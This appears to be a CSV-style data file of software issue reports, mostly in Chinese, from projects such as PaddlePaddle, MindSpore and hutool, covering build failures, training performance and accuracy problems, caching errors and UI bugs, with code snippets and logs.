Saving models/parameters in fault tolerent training,"Related PR: https://github.com/PaddlePaddle/Paddle/pull/2634 In a discussion with @HelinWang this morning, previous thought was to save parameters to a distributed storage service by merging parameters from all pservers. In general there are two ways: save parameter snapshots on each pserver, and then merge them together <em>recommended method:</em> use API call to trigger snapshot saving, each pserver saves parameters on the distributed filesystem, this also saves the pserver status for recovering. Users can use a ""model merge tool"" to merge all the parts of the model and then use it. save merged parameter(the model) on one trainer trainers will fetch the whole model every iteration, so saving models from trainer do not need a ""merge"" step. Models will be saved every pass. how to select exactly one trainer to save the model use etcd distributed lock or transaction use something like Notice: when users want to stop the training and use the current output models, he can stop the job right away, because the job will save every pass model into the distributed storage service.   <code>: Save hash(trainer_ip) % trainer_count == 0"
终端装修的问题,"1、首次进入，完成装修保存后，再修改点保存，会保存多份装修数据，导致再次进来报语法错误，如下： 2、已做过装修再进入，是空白的（实际需要点一下那个图标），会误认为没有装修，完成装修后也会出现问题1   <code>: {status: 400, timestamp: ""2021-06-24 22:41:44"",…} message: ""nested exception is org.apache.ibatis.exceptions.TooManyResultsException: Expected one result (or null) to be returned by selectOne(), but found: 7"" status: 400 timestamp: ""2021-06-24 22:41:44"""
【MindSpore】【Ascend】【C类】【TextFuseNet】1p训练性能不达标,"这里是列表文本模型1p 训练性能不达标 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.1.rc2) --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --mindspore版本：1.8.0 --代码分支：r1.8 (Mandatory / 必填 进行预训练模型的转换以及数据集处理，此处数据集从处理完毕之后的链接直接获取； 执行1p 训练命令：bash run_standalone.sh ../resnet101_backbone.ckpt /data/textfusenet_data/ 训练执行完毕后查看训练日志 ：cat train/log.txt 1p 训练功能正常，性能&amp;精度达标 查看性能平均值： 用r1.7 的代码，在mindspore 1.7.0 版本测试的性能平均值为： readme 中给定的性能参考值： 与reame中新能参考值相比，1p 性能下降7%-8%。   <code>: root@ubuntu:/home/lh/textfusenet-r1.8/scripts# cat train/log.txt | grep -v 574.577 | grep 'per step time'| awk '{print $9}'|awk '{sum += $1} END {print ""Average="",sum/NR, ""sum="", sum, ""number="", NR};' Average= 354.778 sum= 41154.2 number= 116 cat log.txt | grep 'per step time'| grep -v 612.046 | awk '{print $8}'|awk '{sum += $1} END {print ""Average="",sum/NR, ""sum="", sum, ""number="", NR};' Average= 358.707 sum= 71382.7 number= 199 速度 单卡：333毫秒/步；8卡: 300毫秒/步 总时长 单卡：22.4小时；8卡：2.1小时"
用户更名导致部分区域未指向新用户名,DZ35 环境下，用户更名导致部分区域未指向新用户名。 如果用户是新用户，在发起更名后，原有的 userstats 记录的数据未更新导致首页指向的链接失效。 <del>发帖 @ 的用户，在更名后指向链接正确，但是用户名仍为旧名。</del> @老周部落 站长 ? 后台管理团队 管理通知的用户名未指向新用户名。 广播用户名未指向新用户名。 板块最后发表用户名未指向新用户名。 指定分区版主后版主改名，前台与后台均存在未指向新用户名的现象。 版本信息   <code>: 此行为与国际主流方式保持一致，毕竟全量扫对系统负担太重。
在mac os上使用jdk1.8.0_25编译master分支报错,"Mac OS Mojave JDK:1.8.0_25 Jpom master分支 maven编译报错   <code>: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:compile (default-compile) on project server: Compilation failure [ERROR] /Users/xxx/git/Jpom/modules/server/src/main/java/io/jpom/permission/BaseDynamicService.java:[78,90] 对于collect(java.util.stream.Collector&lt;java.lang.Object,capture#1, 共 ?,java.util.List&lt;java.lang.Object&gt;&gt;), 找不到合适的方法 [ERROR] 方法 java.util.stream.Stream.&lt;R&gt;collect(java.util.function.Supplier&lt;R&gt;,java.util.function.BiConsumer&lt;R,? super capture#2, 共 ? extends io.jpom.model.BaseModel&gt;,java.util.function.BiConsumer&lt;R,R&gt;)不适用 [ERROR] (无法推断类型变量 R [ERROR] (实际参数列表和形式参数列表长度不同)) [ERROR] 方法 java.util.stream.Stream.&lt;R,A&gt;collect(java.util.stream.Collector&lt;? super capture#2, 共 ? extends io.jpom.model.BaseModel,A,R&gt;)不适用 [ERROR] (无法推断类型变量 R,A,capture#3, 共 ?,T [ERROR] (参数不匹配; java.util.stream.Collector&lt;capture#2, 共 ? extends io.jpom.model.BaseModel,capture#4, 共 ?,java.util.List&lt;capture#2, 共 ? extends io.jpom.model.BaseModel&gt;&gt;无法转换为java.util.stream.Collector&lt;? super capture#2, 共 ? extends io.jpom.model.BaseModel,capture#4, 共 ?,java.util.List&lt;capture#2, 共 ? extends io.jpom.model.BaseModel&gt;&gt;)) [ERROR]"
非bug，请教大佬们关于mybatisPlus使用redis缓存的问题,"环境信息 pigx版本: 3.9 想对数据库查询都使用redis进行缓存，mybatisPlus官方建议自定通用ServiceImpl进行缓存，在mapper层缓存分页无法使用 但是如果在ServiceImpl层缓存，项目中又存在好多地方直接用mapper操作的 所以我在mapper层进行缓存，如下，并排除调分页的情况 在mapper上添加注解 在小型springboot项目中这样是可以使用的没有问题，但是pigx中我尝试也用这个办法，发现报错 像是RouteDefinitionVo这个Vo中有List字段，无法序列化，但是奇怪的是在部门管理页面的时候会报这个错 请问大佬们，你们有进行二级缓存吗，或者说我这种情况有什么办法可以解决呢   <code>: // 重写put get 等方法，使用redisTemplate进行缓存 public class MybatisRedisCache implements Cache{ @Override public void putObject(Object key, Object value) { if (value != null) { if(key.toString().contains(""selectPage"")){ return; } RedisUtil.getRedisTemplate().opsForHash().put(id, key.toString(), value); RedisUtil.getRedisTemplate().expire(id, 10, TimeUnit.MINUTES); } } } @Mapper @CacheNamespace(implementation = MybatisRedisCache.class, eviction = MybatisRedisCache.class) public interface SysTenantMapper extends BaseMapper&lt;SysTenant&gt; { } org.springframework.data.redis.serializer.SerializationException: Could not read JSON: Cannot deserialize instance of `*.*.*.common.gateway.vo.RouteDefinitionVo` out of START_ARRAY token at [Source: (byte[])""[{""roleId"":1,""roleName"":""管理员"",""roleCode"":""ROLE_ADMIN"",""roleDesc"":""管理员"",""dsType"":0,""dsScope"":""2"",""createTime"":{""dayOfWeek"":""SUNDAY"",""dayOfYear"":302,""year"":2017,""month"":""OCTOBER"",""nano"":0,""monthValue"":10,""dayOfMonth"":29,""hour"":15,""minute"":45,""second"":51,""chronology"":{""id"":""ISO"",""calendarType"":""iso8601""}},""updateTime"":{""dayOfWeek"":""WEDNESDAY"",""dayOfYear"":360,""year"":2018,""month"":""DECEMBER"",""nano"":0,""monthValue"":12,""dayOfMonth"":26,""hour"":14,""minute"":9,""second"":11,""chronology"":{""id"":""ISO"",""[truncated 42 bytes]; line: 1, column: 1];"
[ST][MS][CI][ssd densenet100][windows]偶现训练失败,"ssd densenet100网络在windows环境偶现训练失败 / 硬件环境: /device windows : -- MindSpore version :commit_id = ''[sha1]:b04d427e,[branch]:master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_densenet100_cifar10_win_train_check_loss_0001.py pytest -s test_ms_densenet100_cifar10_win_train_check_loss_0001.py 训练ok 转给黄炳坚   <code>: [WARNING] ME(1808:992,MainProcess):2022-10-19-04:25:58.886.082 [mindspore\train\model.py:1091] For ProgressMonitor callback, {'epoch_end', 'step_end', 'end', 'begin', 'epoch_begin', 'step_begin'} methods may not be supported in later version, Use methods prefixed with 'on_train' or 'on_eval' instead when using customized callbacks. 2022-10-19 04:25:58,979:INFO:start network train... [ERROR] ME(1808,1,?):2022-10-19 4:25:55 [mindspore\ccsrc\runtime\hardware\device_context_manager.cc:53] LoadDynamicLib] Load dynamic library mindspore_gpu failed, returns [126]. [WARNING] DEBUG(1808,1,?):2022-10-19 4:26:0 [mindspore\ccsrc\common\debug\rdr\recorder_manager.cc:43] UpdateRdrEnable] The RDR only supports linux os currently. [CRITICAL] CORE(1808,1,?):2022-10-19 4:26:3 [mindspore\core\abstract\abstract_value.cc:76] ShapeJoinLogging] Shape Join Failed: shape1 = (10, 342), shape2 = (48, 330, 1, 1). For more details, please refer to https://www.mindspore.cn/search?inputValue=Shape%20Join%20Failed、"
max pool Layer with mask,"fix #4889:add book02.recognize_digits mlp train test python usage:   <code>: tmp = paddle.layer.img_pool( input=tmp, pool_size=7, stride=1, pool_type=paddle.pooling.MaxWithMask())"
No unified mechanism for converting function to OpKernel,"At first, we think we should provide a unified way to converting or into an . It could Fuse GPU calls to one kernel. Functor should easily convert to OpKernel. However, when digging into details of tensorflow, the several issues were found. Tensorflow does not provide a unified way to converting to . It directly creates a functor instance. Reference 1. Tensorflow does not have a unified interface of Functor, and the implementation of Functor is generated. Reference 2. So we will not provide a unified mechanism for converting function to OpKernel and will not provide unified interfaces for Functors. It is developer's choice whether to implement CPU/GPU kernel in functor or directly in . However, if a functor could be shared with many operators, it should be written in Functor class or global functions.   <code>: Function Functor OpKernel Function Kernel OpKernel CPU/GPU"
Linux 系统浏览器无法开启ueditor模式编辑,"Linux 系统浏览器无法开启ueditor模式编辑 原因在于 mblog/mblog-web/src/main/webapp/themes/default/editor/ueditor.vm 16行:if (!mblog.browser.ios &amp;&amp; !mblog.browser.android) { 在 mblog/mblog-web/src/main/webapp/assets/js/utils.js 18行: android: u.indexOf('Android') &gt; -1 || u.indexOf('Linux') &gt; -1, //android终端或者uc浏览器 错误的将Linux浏览器包含在Android中,建议去掉或者增加过滤字段使其更加精确 以下代码仅供参考   <code>: android: u.indexOf('Android') &gt; -1 &amp;&amp; !mblog.browser.linuxNotIsAndroid, //android终端或者uc浏览器 linuxNotIsAndroid: u.indexOf(""Android"") == -1 &amp;&amp; //不是Android u.indexOf(""Linux"") &gt; -1 &amp;&amp; //但是包含Linux (u.indexOf(""X11"") &gt; -1 || (u.indexOf(""X86"")&gt;-1 || u.indexOf(""AMD"")&gt;-1)) //同时是X11桌面,CPU是英特尔或者AMD ,"
generic.cmake must not depends on other .cmake files,"generic.cmake was designed by @gangliao to mimic the behavior of Bazel. It was designed from fresh so to make our build system lean and mean. However, I noticed that recently it calls defined in another cmake file https://github.com/PaddlePaddle/Paddle/blob/e90e7ab237723ddab75be247d5f29780968924f4/cmake/inference_lib.cmake#L17   <code>: find_fluid_modules"
"Call rt api rtStreamSynchronize failed, ret: 507011","![我正在测试mindspore 1.3版本推荐系统的ncf算法， 做profiler操作，出现如图所示error。 我的train代码如下` config.group_size = get_device_num() context.reset_auto_parallel_context() context.set_auto_parallel_context(device_num=config.group_size, parallel_mode=ParallelMode.DATA_PARALLEL, parameter_broadcast=True, gradients_mean=True) context.set_context(device_id=get_device_id()) print('start'+'*'<em>20) context.set_context(mode=context.GRAPH_MODE,device_target=config.device_target,save_graphs=True, save_graphs_path='/cache/train/graphs',enable_profiling=True,profiling_options='{""result_path"":""/cache/train/profile"",""training_trace"":""on""}') profiler = Profiler(output_path='/cache/train/profile', is_detail=True, is_show_op_path=False, subgraph='all') print('</em>'*20) //comp/parallel   <code>: init()` ]()"
[ST][MS/modelzoo][NET][naml][ascend310] acc:50% is smaller than standard(66%),"naml-ascend 310 实测精度auc acc : 50% 达不到标准66% / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:c915f9ed -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220810 MindSpore 版本：编译时间202209 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_naml_ascend310_train_infer_8p_0001.py cd solution_test/cases/02network/00cv/naml/train/ pytest -s test_ms_naml_ascend310_train_infer_8p_0001.py 网络训练成功,精度达到66% 走给徐邦铎   <code>: auc acc : 50%"
defaultEngine.html文件里的<@compress single_line=true>指令在哪定义的？,"defaultEngine.html文件里的&lt;@压缩 single_line=true&gt;指令在哪定义的？ 在别的文件里可以直接这样用： 我用原生的freemarker,定义一个模板 通过如下方法解析模板： 会报错：   <code>: &lt;@compress single_line=true&gt; $(""#form-history-edit"").validate({ focusCleanup: true }); &lt;/@compress&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;title&gt;Freemarker DEMO &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;#--我只是一个注释，我不会有任何输出 --&gt; ${name},你好。${message} &lt;@compress single_line=true&gt; ""First cell"" &lt;#if something &gt; |""Second cell"" &lt;/#if&gt; |""Third cell"" &lt;/@compress&gt; &lt;/body&gt; &lt;/html&gt; public static void main(String[] args) throws Exception { // 1.设置配置类 Configuration configuration = new Configuration(Configuration.getVersion()); //2. 设置模板所在的目录 configuration.setDirectoryForTemplateLoading( new File(""D:/xxxx/2020/"")); //3.设置字符集 configuration.setDefaultEncoding(""utf-8""); //4.加载模板 Template template = configuration.getTemplate(""test.html""); //5.创建数据模型 HashMap map = new HashMap(); map.put(""name"", ""周杰伦""); map.put(""message"", ""我是你的老歌迷了""); //6.创建Writer对象 FileWriter writer = new FileWriter(new File(""D:/data/xxxx/as.html"")); //7.输出数据模型到文件中 template.process(map, writer); //8.关闭Writer对象 writer.close(); } FTL stack trace (""~"" means nesting-related): - Failed at: #if something [in template ""test.html"" at line 11, column 1] - Reached through: @compress single_line=true [in template ""test.html"" at line 9, column 1]"
springboot-starter无法建议局部header,用的这个包   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;!--在引用时请在maven中央仓库搜索2.X最新版本号--&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt;
【众智】【计算-AICPU接入】AddN,"AICPU算子接入 将输入的n个tensor逐元素相加。 接口目录：mindspore/ops/operation/array_ops.py x y N int 属性 对应底层算子 对应底层AI CPU算子AddN 标杆接口参考 TF接口： tf.raw_ops.AddN https://www.tensorflow.org/api_docs/python/tf/raw_ops/AddN 3. 异常处理 4. 算子反向 可参考tf @ops.RegisterGradient(""AddN"")   <code>: class AddN(Primitive): REG_OP(AddN) .DYNAMIC_INPUT(x, TensorType::NumberType()) .OUTPUT(y, TensorType::NumberType()) .REQUIRED_ATTR(N, Int) .OP_END_FACTORY_REG(AddN) def _AddNGrad(op, grad): return [grad] * len(op.inputs)"
表格行内编辑，拖拽行后新增行失效,"未进行拖拽行的时候新增行有效，进行拖拽后新增行就会失效，demo如下   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('表格拖拽操作')"" /&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""container-div""&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12 select-table table-striped""&gt; &lt;p class=""select-title""&gt;按住表格拖拽&lt;/p&gt; &lt;a class=""btn btn-success"" onclick=""insertRow()""&gt; &lt;i class=""fa fa-plus""&gt;&lt;/i&gt; 新增行 &lt;/a&gt; &lt;table id=""bootstrap-table"" data-use-row-attr-func=""true"" data-reorderable-rows=""true""&gt;&lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div th:include=""include :: footer""&gt;&lt;/div&gt; &lt;th:block th:include=""include :: bootstrap-table-reorder-js"" /&gt; &lt;script th:inline=""javascript""&gt; var prefix = ctx + ""demo/table""; var datas = [[${@dict.getType('sys_normal_disable')}]]; $(function() { var options = { url: prefix + ""/list"", showSearch: false, showRefresh: false, showToggle: false, showColumns: false, onReorderRow: function (data) { //当拖拽结束后，data为整个表格的数据 console.log('拖拽结束' + JSON.stringify(data)) return false; }, columns: [{ checkbox: true }, { field : 'userId', title : '用户ID' }, { field : 'userCode', title : '用户编号' }, { field : 'userName', title : '用户姓名' }, { field : 'userPhone', title : '用户手机' }, { field : 'userEmail', title : '用户邮箱' }, { field : 'userBalance', title : '用户余额' }, { field: 'status', title: '用户状态', align: 'center', formatter: function(value, row, index) { return $.table.selectDictLabel(datas, value); } }] }; $.table.init(options); }); /* 新增表格行 */ function insertRow(){ var randomId = 100 + ~~(Math.random() * 100) $(""#"" + table.options.id).bootstrapTable('insertRow', { index: 0, // 你想插入到哪，0表示第一行 row: { userId: randomId, userCode: 2000000 + randomId, userName: '测试' + randomId, userPhone: '1588888888', userEmail: 'ry1@qq.com', userBalance: 10 + randomId, } }) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
针对layui表格的建议,layui目前的表格中如果文本超长，使用...代替，显示不是非常直观。这时候如果有想全部显示出来，使用网友的解决方案：&gt; 可以解决问题。但是如果有开启右侧的toolbar，这时候会出现没有对齐的情况。右侧浮动的TD的高度不对。如下图 建议官方增加针对此种场景下的属性配置。超长文本是自动换行、还是自动缩放。   <code>: .layui-table-cell { font-size:14px; padding:0 5px; height:auto; overflow:visible; text-overflow:inherit; white-space:normal; word-break: break-all; }
集群上使用dataloader加载数据总是报错。,"搜索过相关文档，修改等参数都不行。单机运行时可以加载数据，但是在超算平台运行的时候，就会报错。 相关配置 系统：Linux 3.10.0-514.21.1.el7.x86_64 Thu May 25 17:04:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux paddle：2.0.0-rc0 python: Python 3.7.7 GPU: 2080Ti CUDA,10.1，cuDNN Version: 7.6 报错信息如下： 代码： 来自项目“https://aistudio.baidu.com/aistudio/projectdetail/1428288”   <code>: places=paddle.CPUPlace(),use_buffer_reader=False,use_shared_memory=False [2021-01-06 09:35:26,143] [ INFO] - Already cached /mnt/lustre02/jiangsu/aispeech/home/mll12/.paddlenlp/models/ernie-1.0/ernie_v1_chn_base.pdparams W0106 09:35:26.144517 176367 device_context.cc:338] Please NOTE: device: 0, CUDA Capability: 75, Driver API Version: 10.1, Runtime API Version: 10.1 W0106 09:35:26.145131 176367 device_context.cc:346] device: 0, cuDNN Version: 7.6. /mnt/lustre02/jiangsu/aispeech/home/mll12/anaconda3/envs/paddle/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py:1175: UserWarning: Skip loading for classifier.weight. classifier.weight is not found in theprovided dict. warnings.warn((""Skip loading for {}. "".format(key) + str(err))) /mnt/lustre02/jiangsu/aispeech/home/mll12/anaconda3/envs/paddle/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py:1175: UserWarning: Skip loading for classifier.bias. classifier.bias is not found in the provided dict. warnings.warn((""Skip loading for {}. "".format(key) + str(err))) WARNING:root:DataLoader reader thread raised an exception. Traceback (most recent call last): File ""main.py"", line 144, in &lt;module&gt; main() File ""main.py"", line 141, in main finetune(train_data_loader, dev_data_loader, label_list, tokenizer) File ""main.py"", line 112, in finetune for step, batch in enumerate(train_data_loader, start=1): File ""/mnt/lustre02/jiangsu/aispeech/home/mll12/anaconda3/envs/paddle/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 341, in __next__ return self._reader.read_next_var_list() paddle.fluid.core_avx.EnforceNotMet: -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 std::thread::_State_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;ThreadPool::ThreadPool(unsigned long)::{lambda()#1}&gt; &gt; &gt;::_M_run() 1 std::_Function_handler&lt;void (), ThreadPool::enqueue&lt;paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::ReadAsync()::{lambda()#1}&gt;(std::result_of&amp;&amp;, (paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::ReadAsync()::{lambda()#1}&amp;&amp;)...)::{lambda()#1}&gt;::_M_invoke(std::_Any_data const&amp;) 2 std::__future_base::_State_baseV2::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*) 3 std::_Function_handler&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; (), std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::Status&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::__future_base::_Task_state&lt;std::_Bind&lt;paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::ReadAsync()::{lambda()#1} ()&gt;, std::allocator&lt;int&gt;, paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::Status ()&gt;::_M_run()::{lambda()#1}, paddle::pybind::MultiDeviceFeedReader&lt;paddle::operators::reader::LoDTensorBlockingQueue&gt;::Status&gt; &gt;::_M_invoke(std::_Any_data const&amp;) 4 paddle::operators::reader::PyReader::ReadNext(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 5 paddle::operators::reader::BlockingQueue&lt;std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt; &gt;::Receive(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 6 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 7 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed_ != true, but received killed_:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154) from utils import convert_example, create_dataloader, evaluate def read_from_tsv(file_path: str) -&gt; list: data = [] csv.register_dialect('tsv_dialect', delimiter='\t', quoting=csv.QUOTE_ALL) with open(file_path, ""r"") as wf: reader = csv.DictReader(wf, fieldnames=[""desc"", ""dept""], dialect='tsv_dialect') for row in reader: item = dict(row) # yield item[""desc""], item[""dept""] data.append((item[""desc""], item[""dept""])) csv.unregister_dialect('tsv_dialect') return data def create_dataloaders(tokenizer: ppnlp.transformers.ErnieTokenizer, label_list: List[str], batch_size: int = 32): batchify_fn = lambda samples, fn=Tuple( Pad(axis=0, pad_val=tokenizer.pad_token_id), # input ids Pad(axis=0, pad_val=tokenizer.pad_token_id), # segment ids Stack(dtype=""int64"") # label ): [data for data in fn(samples)] label2idx = { label: idx for idx, label in enumerate(label_list) } trans_func = partial( convert_example, tokenizer=tokenizer, label2idx=label2idx, max_seq_length=256) train_path = ""./data/dept_cls.train.tsv"" train_ds = MapDatasetWrapper(read_from_tsv(train_path)) train_data_loader = create_dataloader( train_ds, mode='train', batch_size=batch_size, batchify_fn=batchify_fn, trans_fn=trans_func) utils.py"
Lambda有个扩展Model的抽象基类，会导致异常,当前使用版本：3.0-RC3 基类信息：public abstract class AssociationId&lt;T extends Model&gt; extends Model { }   <code>: private static final long serialVersionUID = 1L; public abstract Long getId(); public abstract void setAssociationId(Long associationId); public abstract Long getAssociationId();
[CI][MS][Doc]Example format error of OGridClass in Doc API.,": Ascend/CPU/GPU /device gpu /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : Open link https://gitee.com/mindspore/mindspore/blame/master/mindspore/numpy/array_creations.py line 1438 Execute the example. Result correct. Format error in result，missing comma.   <code>: File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/numpy/array_creations.py"", line 1434, in mindspore.numpy.array_creations.OGridClass Failed example: print(output) Expected: [Tensor(shape=[5, 1], dtype=Int32, value= [[0], [1], [2] [3], [4]]), Tensor(shape=[1, 5], dtype=Int32, value= [[0, 1, 2, 3, 4]])] Got: [Tensor(shape=[5, 1], dtype=Int32, value= [[0], [1], [2], [3], [4]]), Tensor(shape=[1, 5], dtype=Int32, value= [[0, 1, 2, 3, 4]])]"
watchdog 没有用宏隔离,关闭watchdog后，编译报错。 make menuconfig 去掉 勾选 执行   <code>: drivers/Enable HDF platform watchdog driver make -j ld.lld: error: undefined symbol: WatchdogStop &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) ld.lld: error: undefined symbol: WatchdogClose &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) ld.lld: error: undefined symbol: WatchdogOpen &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) ld.lld: error: undefined symbol: WatchdogSetTimeout &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) ld.lld: error: undefined symbol: WatchdogStart &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) ld.lld: error: undefined symbol: WatchdogFeed &gt;&gt;&gt; referenced by ld-temp.o &gt;&gt;&gt; lto.tmp:(OsShellCmdSystemExcReset) Makefile:155: recipe for target 'liteos' failed make: *** [liteos] Error 1
ERNIE application stop build ,"branch: PaddlePaddle:develop commit: 715d862868aca6ae4c865dc3db1cde6818e4ad1a caused the ERNIE application to stop building build command: Error message:   <code>: cd /root/models/benchmark/Inference/c++/ernie/ mkdir build cd build cmake .. -DPADDLE_ROOT=/repos/paddle_paddle/build/paddle_inference_install_dir -DUSE_GPU=OFF make -j 20 Scanning dependencies of target inference [ 50%] Building CXX object CMakeFiles/inference.dir/inference.cc.o /root/models/benchmark/Inference/c++/ernie/inference.cc: In function 'void InitFLAGS(int, char**)': /root/models/benchmark/Inference/c++/ernie/inference.cc:61:3: error: 'gflags' has not been declared gflags::ParseCommandLineFlags(&amp;argc, &amp;argv, true); ^ CMakeFiles/inference.dir/build.make:62: recipe for target 'CMakeFiles/inference.dir/inference.cc.o' failed make[2]: *** [CMakeFiles/inference.dir/inference.cc.o] Error 1 CMakeFiles/Makefile2:72: recipe for target 'CMakeFiles/inference.dir/all' failed make[1]: *** [CMakeFiles/inference.dir/all] Error 2 Makefile:83: recipe for target 'all' failed make: *** [all] Error 2"
[华师大][Mindspore][ImageFloderDataset]get_dataset_size()函数输出错误,"ImageFloderDataset get_dataset_size() bug Hardware Environment(): /device ascend : -- MindSpore version (1.0.1): -- Python version : -- OS platform and distribution : 这个是原本运行在版本下，根据生成的代码 这个是运行在版本下，根据生成的代码,将更改为了 将ImageNet数据集路径传入,调用dataset的方法 log中的 这个是在版本下调用生成的 log中的 这个是在版本下调用生成的 Mindspore 0.5-beta版本训练，两个小时一轮 换成Mindspore 1.0版本后，8个小时一轮仍然没有跑完，怀疑是这个接口的问题   <code>: Mindspore0.5-beta ImageNet dataset if input_mode == 'folder': de_dataset = de.ImageFolderDatasetV2(data_dir, num_parallel_workers=num_parallel_workers, shuffle=shuffle, sampler=sampler, class_indexing=class_indexing, num_shards=group_size, shard_id=rank) Mindspore1.0.1 ImageNet dataset ImageFolderDatasetV2 ImageNetFolderDataset if input_mode == 'folder': de_dataset = de.ImageFolderDataset(data_dir, num_parallel_workers=num_parallel_workers, shuffle=shuffle, sampler=sampler, class_indexing=class_indexing, num_shards=group_size, shard_id=rank) ImageFolderDataset get_dataset_size() step_per_epoch = de_dataset.get_dataset_size() Mindspore 1.0 ImageFolderDataset de_dataset (pyj) [root@localhost resnext101]# python train.py 2020-11-14 12:38:37,004:INFO:Args: 2020-11-14 12:38:37,004:INFO:--&gt; data_dir: /data/dataset/ImageNet/imagenet_original/train 2020-11-14 12:38:37,004:INFO:--&gt; per_batch_size: 32 ..... 2020-11-14 12:38:37,007:INFO:--&gt; steps_per_epoch: 6005400 ..... ********************************************************************** ********************************************************************** ** ** ** start create network ** ** ********************************************************************** ********************************************************************** step_per_epoch = de_dataset.get_dataset_size() Mindspore 0.5-beta ImageFolderDatasetV2 de_dataset 2020-11-11 22:24:48,767:INFO:Args: 2020-11-11 22:24:48,768:INFO:--&gt; data_dir: /data/dataset/ImageNet/imagenet_original/train 2020-11-11 22:24:48,768:INFO:--&gt; per_batch_size: 32 ..... 2020-11-11 22:24:48,777:INFO:--&gt; steps_per_epoch: 40036 ..... ********************************************************************** ********************************************************************** ** ** ** start create network ** ** ********************************************************************** **********************************************************************"
ObjectUtil.defaultIfNull 入参类型变更的意义是？,"JDK版本： OpenJDK 17.0.3 hutool版本： 5.8.7 因为变更记录里没有对应的变更注释，源代码中也没有找到，没有明白后者更显繁琐的写法的意义在于何处，请指教。   <code>: // 5.8.5 版本时未标注 @Deprecated，5.8.7 版本发现标注 // 对应签名 public static &lt;T&gt; T defaultIfNull(T source, Supplier&lt;? extends T&gt; defaultValueSupplier) ObjectUtil.defaultIfNull(attr, UploadFileAttributeDTO::new); // 5.8.7 版本新增的？ // 对应签名 public static &lt;T&gt; T defaultIfNull(T source, Function&lt;T , ? extends T&gt; defaultValueSupplier) ObjectUtil.defaultIfNull(attr, uploadFileAttributeDTO -&gt; new UploadFileAttributeDTO());"
EntityWrapper语法糖，问题来啦,"@清风、 风神，entityWrapper有一个问题： 这个时候出来的sql其实是 xx_date&gt;2017-2-2 and xx_date&lt;2017-3-3//这个根本不会有结果，因为2个条件其实是xx_date&gt;2013 and xx_date&lt;2011(做的 减法 ) 如果date1,date2传string，在mysql下没问题，xx_date&gt;'2017-2-2' and xx_date&lt;'2017-3-3', 在其他数据库（oracle）就挂了 百思不得其姐。。。   <code>: ew.and(""xx_date &gt;{0} and xx_date&lt;{1}"", date1, date2)//Date date1, date2 2个日期类型"
